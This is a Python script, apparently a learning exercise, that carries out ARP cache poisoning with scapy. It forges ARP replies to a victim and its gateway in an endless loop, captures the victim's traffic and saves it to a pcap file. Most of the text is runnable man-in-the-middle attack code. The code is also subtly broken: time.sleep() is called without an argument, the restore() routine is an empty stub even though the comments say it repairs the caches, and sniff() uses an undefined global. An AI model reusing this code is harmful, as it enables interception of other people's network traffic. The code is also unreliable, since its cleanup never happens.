# 𝗔𝗥𝗣 𝗔𝘁𝘁𝗮𝗰𝗸𝘀:
# It consist of, basically, convincing the target that we are it's gateway
# Smilarly, we convince the actual gateway that we are a router to the target
# Thus, all trafic between both entities ends up going through us
# To do so, we poison the ARP cache of both points and masks ourself with their MACs (Media Acces Control) address
# The MAC is assigned based on the local network IP of the machine
# 𝘪𝘱 𝘯𝘦𝘪𝘨𝘩 𝘴𝘩𝘰𝘸 <to see ARP cache in linux>
# sudo arp -a <works too>

import os
import sys
import time
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

def get_mac(targetship):
    packet = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetship)
    # Pass target ip to create a packet, 𝘌𝘵𝘩𝘦𝘳 𝘧𝘰𝘳 𝘣𝘳𝘰𝘢𝘥𝘤𝘢𝘴𝘵 and 𝘈𝘙𝘗 𝘵𝘰 𝘳𝘦𝘲𝘶𝘦𝘴𝘵 𝘔𝘈𝘊 
    resp, _ = srp(packet, timeout=2, retry=0, verbose=False)
    # pass packet onto srp to send on Nerwork level 2 (it also receives)
    for _, r in resp:
        return r[Ether].src
    return None 

class Arper:
    def __init__(self, victim, gateway, interface = 'eth0'):
        self.victim = victim
        self.victimMac = get_mac(victim)
        self.gateway = gateway
        self.gatewayMac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0 
        # initialize the class with the victim and gateway to get their MAC. Specify interface (eth0 as default)
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewayMac}')
        print(f'Victim ({victim}) is at {self.victimMac}')
        print('-'*30)
    
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        # Poison start to unleach attack
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
        # Sniff start to track attack by network sniffing
    
    def poison(self):
        poison_victim = ARP() # poisoned ARP packet for the victim
        poison_victim.op = 2
        poison_victim.psrc = self.gateway # Sending gateway IP 
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimMac # but the attackers MAC 
        
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-'*30)

        poison_gateway = ARP() # poisoned ARP packet for the gateway
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway # Sending victim IP
        poison_gateway.hwdst = self.gatewayMac # but attackers MAC
        
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-'*30)
        
        print('Beginning the ARP poison. [CTRL-C to stop]')
        
        while True: # Infinite loop of sending so the packet remain poisoned during the attack
            sys.stdout.write('.')
            sys.stdout.flush()
            
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt: # end the loop (ie the attack) by restoring the arp cache state
                self.restore()
                sys.exit()
            else:
                time.sleep()
        
    def sniff(self, count=100):
        time.sleep(5) # Wait five
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface) # Sniff n packets (100 by default)
        wrpcap('arper.pcap', packets) # write off packets to arper.pcap
        print("Got em' packets")
        self.restore() # Restore ARP table
        self.poison_thread.terminate() # Stop poisoning
        print('Finished')
       
    def restore(self):
        pass
    
if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    arpoon = Arper(victim, gateway, interface)
    arpoon.run()